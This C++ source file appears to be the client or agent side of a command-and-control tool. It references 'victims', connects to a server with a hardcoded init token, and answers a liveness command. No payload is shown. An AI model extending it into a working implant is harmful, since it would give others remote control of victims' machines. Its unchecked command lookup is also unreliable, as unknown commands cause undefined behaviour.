#include "client.h"

client::client(io::io_context& io_context, std::uint16_t port, std::string server_ip, std::uint16_t server_port, victims* victims)
    : io_context_(io_context),
      acceptor_(io_context, tcp::endpoint(tcp::v4(), port)),
      server_ip_(server_ip),
      server_port_(server_port),
      victims_(victims) {
	command_handlers_ = {
	    {"[ARE_YOU_ALIVE]", boost::bind(&client::handleAlive, this, boost::placeholders::_1, boost::placeholders::_2)},
	};
}

void client::start() {
	tcp::socket socket(io_context_);
	socket_ = std::move(socket);

	err error;
	tcp::endpoint endpoint(io::ip::make_address(server_ip_), server_port_);

	socket_->connect(endpoint, error);

	auto server = server_session_container_.emplace_back(std::make_shared<session>(std::move(*socket_), io_context_, 1));

	server->start(boost::bind(&client::handleResponse, this, boost::placeholders::_1, boost::placeholders::_2));
	server->send("INIT;flk23f9f_f=fsd\n");
	server->read();
}

void client::handleResponse(std::string& query, session* client) {
	std::cout << client->endpoint_ << " Incoming query: " << query << std::endl;

	auto parsed_msg = msg_parser_.parse_msg(query);

	if (parsed_msg["is_valid_msg"][0] == "false") {
		return;
	}
	auto handler = command_handlers_.find(parsed_msg["command"][0])->second;
	if (handler) handler(parsed_msg["params"], client);
}

void client::handleAlive(std::vector<std::string>& params, session* client) { client->send(":msg [ARE_YOU_ALIVE] 1\n"); }